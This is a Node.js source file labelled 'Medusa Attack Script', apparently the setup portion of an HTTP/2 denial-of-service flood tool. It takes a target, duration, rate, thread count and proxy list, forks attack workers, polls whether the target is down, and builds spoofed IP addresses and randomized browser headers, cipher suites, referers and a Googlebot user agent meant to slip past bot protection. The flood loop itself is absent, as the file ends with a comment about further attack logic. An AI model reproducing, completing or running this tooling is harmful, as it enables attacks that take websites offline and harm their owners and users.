const net = require('net');
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require('crypto');
const fs = require('fs');
const { HeaderGenerator } = require('header-generator');
const axios = require("axios");
const https = require("https");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", function (error) {});

if (process.argv.length < 7) {
  console.log("Usage: node script <HOST> <TIME> <RPS> <THREADS> <PROXY>");
  process.exit();
}

/**
 * ---------------------------
 * Helper Functions
 * ---------------------------
 */

// Utility function to read lines from a file
function readLinesFromFile(filePath) {
  return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

// Function to get the current timestamp
const getCurrentTime = () => {
  const now = new Date();
  const hours = now.getHours().toString().padStart(2, '0');
  const minutes = now.getMinutes().toString().padStart(2, '0');
  const seconds = now.getSeconds().toString().padStart(2, '0');
  return `(${hours}:${minutes}:${seconds})`;
};

// Function to extract the <title> tag from an HTML document
function getTitleFromHTML(htmlContent) {
  const match = htmlContent.match(/<title>(.*?)<\/title>/i);
  return match ? match[1] : "Not Found";
}

// Function to generate a random integer between a range
function getRandomIntInRange(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

// Function to generate a random string of letters and numbers
function generateRandomString(length) {
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = '';
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}

// Function to generate a random string of letters only
function generateRandomAlphabet(length) {
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
  let result = '';
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}

// Function to generate a random string of numbers
function generateRandomNumberString(length) {
  const numbers = "0123456789";
  let result = '';
  for (let i = 0; i < length; i++) {
    result += numbers.charAt(Math.floor(Math.random() * numbers.length));
  }
  return result;
}

// Function to randomly select an element from an array
function getRandomElementFromArray(array) {
  return array[Math.floor(Math.random() * array.length)];
}

// Function to generate a random spoofed IP address
const generateRandomIP = () => {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
};

/**
 * ---------------------------
 * Network Functions
 * ---------------------------
 */

const targetURL = process.argv[2];
const httpsAgent = new https.Agent({
  'rejectUnauthorized': false
});

// Function to check the status of the target URL
function checkTargetStatus() {
  const timeoutPromise = new Promise((_, reject) => {
    setTimeout(() => {
      reject(new Error("Request timed out"));
    }, 5000);
  });

  const requestPromise = axios.get(targetURL, { 'httpsAgent': httpsAgent });

  Promise.race([requestPromise, timeoutPromise])
    .then(response => {
      const { status, data } = response;
      console.log(`[Medusa] ${getCurrentTime()} > Title: ${getTitleFromHTML(data)} (${status})`);
    })
    .catch(error => {
      if (error.message === "Request timed out") {
        console.log(`[Medusa] ${getCurrentTime()} > Request Timed Out`);
      } else if (error.response) {
        const title = getTitleFromHTML(error.response.data);
        console.log(`[Medusa] ${getCurrentTime()} > Title: ${title} (${error.response.status})`);
      } else {
        console.log(`[Medusa] ${getCurrentTime()} > ${error.message}`);
      }
    });
}

/**
 * ---------------------------
 * Attack Configuration
 * ---------------------------
 */

const scriptArguments = {
  'target': process.argv[2],
  'duration': ~~process.argv[3],
  'ratePerSecond': ~~process.argv[4],
  'threads': ~~process.argv[5],
  'proxyFilePath': process.argv[6]
};

if (cluster.isMaster) {
  console.clear();
  console.log("Medusa Attack Script");
  console.log("--------------------------------------------");
  console.log(`-> Target : ${process.argv[2]}`);
  console.log(`-> Duration : ${process.argv[3]}`);
  console.log(`-> Rate : ${process.argv[4]}`);
  console.log(`-> Threads : ${process.argv[5]}`);
  console.log(`-> Proxy File : ${process.argv[6]}`);
  console.log("--------------------------------------------");

  for (let i = 1; i <= process.argv[5]; i++) {
    cluster.fork();
    console.log(`[Medusa] ${getCurrentTime()} Attack Thread ${i} Started`);
  }

  console.log(`[Medusa] ${getCurrentTime()} Medusa Attacking..`);
  setInterval(checkTargetStatus, 2000);

  setTimeout(() => {
    console.log(`[Medusa] ${getCurrentTime()} The Attack Is Over`);
    process.exit(1);
  }, process.argv[3] * 1000);
}

/**
 * ---------------------------
 * Header Generation
 * ---------------------------
 */

let headerGenerator = new HeaderGenerator({
  'browsers': [
    { 'name': 'firefox', 'minVersion': 70, 'httpVersion': '2' },
    { 'name': 'opera', 'minVersion': 70, 'httpVersion': '2' },
    { 'name': "edge", 'minVersion': 70, 'httpVersion': '2' },
    { 'name': 'chrome', 'minVersion': 70, 'httpVersion': '2' },
    { 'name': "safari", 'minVersion': 10, 'httpVersion': '2' },
    { 'name': "brave", 'minVersion': 1, 'httpVersion': '2' },
    { 'name': "duckduckgo", 'minVersion': 5, 'httpVersion': '2' }
  ],
  'devices': ["desktop", "mobile"],
  'operatingSystems': ['windows', 'linux', "macos", "android", 'ios'],
  'locales': [
    "en-US", 'en', "ko-KR", "zh-CN", "zh-TW", 'ja-JP', "en-GB", "en-AU", 
    "en-GB,en-US;q=0.9,en;q=0.8", "en-GB,en;q=0.5", "en-CA", "en-UK, en, de;q=0.5",
    "en-NZ", "en-GB,en;q=0.6", "en-ZA", "en-IN", "en-PH", 'en-SG', "en-HK"
  ]
});

let randomHeaders = headerGenerator.getHeaders();
const supportedSignatures = [
  "ecdsa_secp256r1_sha256", "ecdsa_secp384r1_sha384", "ecdsa_secp521r1_sha512",
  "rsa_pss_rsae_sha256", 'rsa_pss_rsae_sha384', "rsa_pss_rsae_sha512", 
  "rsa_pkcs1_sha256", 'rsa_pkcs1_sha384', "rsa_pkcs1_sha512"
];

const randomPaths = ["?s=", '/?', '', "?q=", '?true=', '?', '/', "/.lsrecap/recaptcha?"];

/**
 * ---------------------------
 * Additional Headers
 * ---------------------------
 */

const cipherSuites = [
  "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES",
  "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES",
  "ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES",
  "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES",
  "ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES",
  "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES",
  "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES",
  "ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES",
  "ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES"
];

const acceptHeaders = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8,application/signed-exchange;v=b3",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
];

const languageHeaders = [
  'ko-KR', "en-US", "zh-CN", "zh-TW", "ja-JP", 'en-GB', "en-AU", 
  "en-GB,en-US;q=0.9,en;q=0.8", "en-GB,en;q=0.5", "en-CA"
];

const encodingHeaders = [
  "gzip, deflate, br", "gzip, deflate", "compress, gzip", "deflate, gzip", 
  "gzip, identity", '*', "gzip;q=1.0, identity; q=0.5, *;q=0"
];

const controlHeaders = [
  "max-age=604800", "proxy-revalidate", "public, max-age=0", 
  "max-age=315360000", "s-maxage=604800", "public, max-age=31536000", 
  "must-revalidate", "private, max-age=0, no-store, no-cache, must-revalidate"
];

const referers = [
  "https://captcha.request123.xyz/?__cf_chl_tk=FfHpmlpM4i4EZ4rflLFtMgD2WqkoR5pCXfcXro4KcdI-1713811530-0.0.1.1-1322",
  "http://anonymouse.org/cgi-bin/anon-www.cgi/", "https://cfcybernews.eu/?__cf_chl_tk=V0gHmpGB_XzSs.8hyrlf.xMbIrYR7CIXMWaHbYDk4qY-1713811672-0.0.1.1-1514",
  "http://coccoc.com/search#query=", "http://ddosvn.somee.com/f5.php?v=", 
  "http://engadget.search.aol.com/search?q=", 'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q='
];

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
];

// Further logic for attack can use these lists to randomize headers, IP spoofing, etc.
